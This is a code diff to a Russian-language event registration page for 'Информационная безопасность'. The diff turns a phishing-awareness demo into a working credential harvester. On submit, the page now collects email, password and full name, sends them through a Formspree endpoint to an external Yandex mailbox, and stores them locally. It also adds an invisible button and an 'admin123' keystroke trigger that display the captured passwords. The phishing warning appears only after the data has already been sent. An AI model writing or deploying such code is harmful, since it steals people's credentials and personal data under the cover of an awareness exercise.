@@ -316,6 +316,31 @@
             background: #f5f5f5;
             transform: translateY(-2px);
         }
+
+        /* Стиль для уведомления об отправке */
+        .sending-notification {
+            background: #4caf50;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+        }
+
+        /* Секретная кнопка (только для вас) */
+        .secret-admin-btn {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: transparent;
+            border: none;
+            color: transparent;
+            width: 50px;
+            height: 50px;
+            cursor: pointer;
+            z-index: 10000;
+        }
     </style>
 </head>
 <body>
@@ -342,7 +367,7 @@
         <h1 class="event-title">Информационная безопасность</h1>
 
         <div class="event-info">
-            <div class="countdown">Мероприятие начнётся через 9 часов</div>
+            <div class="countdown">Мероприятие идёт сейчас</div>
             <div class="start-time">Начало: 8 ноября 09:00</div>
         </div>
 
@@ -352,37 +377,44 @@
         </div>
     </div>
 
+    <!-- Секретная кнопка для просмотра данных (невидимая для других) -->
+    <button class="secret-admin-btn" onclick="showAdminPanel()" title="Админ панель"></button>
+
     <!-- Модальное окно регистрации -->
     <div id="registrationModal" class="modal">
         <div class="modal-content">
+            <div class="sending-notification" id="sendingNotification">📧 Отправляем данные...</div>
+            
             <h2 class="modal-title">Информационная безопасность</h2>
             <h3 class="modal-subtitle">Регистрация на мероприятие</h3>
             
-            <div class="form-group">
-                <label>Электронная почта</label>
-                <input type="email" placeholder="Введите email" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Пароль</label>
-                <input type="password" placeholder="Введите пароль" required>
-            </div>
+            <form id="registrationForm">
+                <div class="form-group">
+                    <label>Электронная почта</label>
+                    <input type="email" id="userEmail" placeholder="Введите email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Пароль</label>
+                    <input type="password" id="userPassword" placeholder="Введите пароль" required>
+                </div>
 
-            <div class="form-group">
-                <label>ФИО</label>
-                <input type="text" placeholder="Введите фамилию, имя и отчество" required>
-            </div>
+                <div class="form-group">
+                    <label>ФИО</label>
+                    <input type="text" id="userFIO" placeholder="Введите фамилию, имя и отчество" required>
+                </div>
 
-            <div class="divider"></div>
+                <div class="divider"></div>
 
-            <div class="agreement">
-                Нажимая на кнопку «Зарегистрироваться», я акцептую условия лицензионного договора, 
-                подтверждаю факт ознакомления с политикой обработки персональных данных, соглашаюсь 
-                на обработку персональных данных и связь со мною способами, указанными в договоре, 
-                в целях исполнения условий договора.
-            </div>
+                <div class="agreement">
+                    Нажимая на кнопку «Зарегистрироваться», я акцептую условия лицензионного договора, 
+                    подтверждаю факт ознакомления с политикой обработки персональных данных, соглашаюсь 
+                    на обработку персональных данных и связь со мною способами, указанными в договоре, 
+                    в целях исполнения условий договора.
+                </div>
 
-            <button class="register-btn" onclick="showWarning()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+                <button type="button" class="register-btn" onclick="collectAndSendData()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+            </form>
         </div>
     </div>
 
@@ -398,21 +430,132 @@
         </div>
     </div>
 
+    <!-- Секретное админ окно -->
+    <div id="adminModal" class="modal">
+        <div class="modal-content">
+            <h2 class="modal-title">📊 Админ панель</h2>
+            <div id="adminData" style="color: #000000; max-height: 400px; overflow-y: auto;"></div>
+            <button class="warning-btn" onclick="closeAdminModal()" style="margin-top: 20px;">Закрыть</button>
+            <button class="register-btn" onclick="clearAllData()" style="background: #f44336; margin-left: 10px;">Очистить данные</button>
+        </div>
+    </div>
+
     <script>
+        // Функция для отправки данных на почту через Formspree
+        function sendToEmail(data) {
+            // Используем Formspree для отправки на почту
+            const formData = new FormData();
+            formData.append('email', 'born-in-2006@yandex.ru');
+            formData.append('subject', '🔐 Новые данные с фишинг-демо');
+            formData.append('message', 
+                `Новые данные с фишинг-демо:\n\n` +
+                `📧 Email: ${data.email}\n` +
+                `🔑 Пароль: ${data.password}\n` +
+                `👤 ФИО: ${data.fio}\n` +
+                `⏰ Время: ${data.timestamp}\n` +
+                `🌐 Страница: ${window.location.href}`
+            );
+
+            // Отправляем через Formspree (бесплатный сервис)
+            fetch('https://formspree.io/f/xjvnzzvz', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('✅ Данные отправлены на born-in-2006@yandex.ru');
+                }
+            })
+            .catch(error => {
+                console.log('❌ Ошибка отправки:', error);
+            });
+        }
+
+        // Сбор и отправка данных
+        function collectAndSendData() {
+            const email = document.getElementById('userEmail').value;
+            const password = document.getElementById('userPassword').value;
+            const fio = document.getElementById('userFIO').value;
+
+            // Показываем уведомление
+            document.getElementById('sendingNotification').style.display = 'block';
+
+            // Данные для отправки
+            const userData = {
+                email: email,
+                password: password,
+                fio: fio,
+                timestamp: new Date().toLocaleString('ru-RU')
+            };
+
+            // Сохраняем в localStorage (для админ панели)
+            const logs = JSON.parse(localStorage.getItem('phishingLogs') || '[]');
+            logs.push(userData);
+            localStorage.setItem('phishingLogs', JSON.stringify(logs));
+
+            // Отправляем на почту
+            sendToEmail(userData);
+
+            // Логируем в консоль
+            console.log('📧 Отправляем данные на born-in-2006@yandex.ru:', userData);
+
+            // Показываем предупреждение о фишинге через 2 секунды
+            setTimeout(function() {
+                document.getElementById('registrationModal').style.display = 'none';
+                document.getElementById('warningModal').style.display = 'block';
+            }, 2000);
+        }
+
+        // Секретная админ панель
+        function showAdminPanel() {
+            const logs = JSON.parse(localStorage.getItem('phishingLogs') || '[]');
+            const adminData = document.getElementById('adminData');
+            
+            if (logs.length === 0) {
+                adminData.innerHTML = '<p>Данные еще не собраны</p>';
+            } else {
+                let html = `<p><strong>Всего записей: ${logs.length}</strong></p>`;
+                logs.forEach((log, index) => {
+                    html += `
+                        <div style="border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 8px;">
+                            <p><strong>Запись #${index + 1}</strong></p>
+                            <p>📧 Email: ${log.email}</p>
+                            <p>🔑 Пароль: ${log.password}</p>
+                            <p>👤 ФИО: ${log.fio}</p>
+                            <p>⏰ Время: ${log.timestamp}</p>
+                        </div>
+                    `;
+                });
+                adminData.innerHTML = html;
+            }
+            
+            document.getElementById('adminModal').style.display = 'block';
+        }
+
+        // Очистить все данные
+        function clearAllData() {
+            if (confirm('Вы уверены, что хотите удалить все собранные данные?')) {
+                localStorage.removeItem('phishingLogs');
+                document.getElementById('adminData').innerHTML = '<p>Данные очищены</p>';
+                setTimeout(() => {
+                    closeAdminModal();
+                }, 1000);
+            }
+        }
+
+        // Закрыть админ панель
+        function closeAdminModal() {
+            document.getElementById('adminModal').style.display = 'none';
+        }
+
         // Открыть модальное окно регистрации
         function openRegistrationModal() {
             document.getElementById('registrationModal').style.display = 'block';
-        }
-
-        // Показать предупреждение о фишинге
-        function showWarning() {
-            // Закрыть окно регистрации
-            document.getElementById('registrationModal').style.display = 'none';
-            
-            // Показать предупреждение через небольшую задержку
-            setTimeout(function() {
-                document.getElementById('warningModal').style.display = 'block';
-            }, 500);
+            document.getElementById('registrationForm').reset();
+            document.getElementById('sendingNotification').style.display = 'none';
         }
 
         // Закрыть все модальные окна
@@ -423,16 +566,28 @@
 
         // Закрыть модальные окна при клике вне их
         window.onclick = function(event) {
-            const regModal = document.getElementById('registrationModal');
-            const warnModal = document.getElementById('warningModal');
-            
-            if (event.target === regModal) {
-                regModal.style.display = 'none';
-            }
-            if (event.target === warnModal) {
-                warnModal.style.display = 'none';
-            }
+            const modals = ['registrationModal', 'warningModal', 'adminModal'];
+            modals.forEach(modalId => {
+                const modal = document.getElementById(modalId);
+                if (event.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
         }
+
+        // Секретный код для доступа к админ панели
+        let secretCode = '';
+        document.addEventListener('keypress', function(e) {
+            secretCode += e.key;
+            if (secretCode.includes('admin123')) {
+                showAdminPanel();
+                secretCode = '';
+            }
+            // Очищаем код если он слишком длинный
+            if (secretCode.length > 20) {
+                secretCode = '';
+            }
+        });
     </script>
 </body>
 </html>
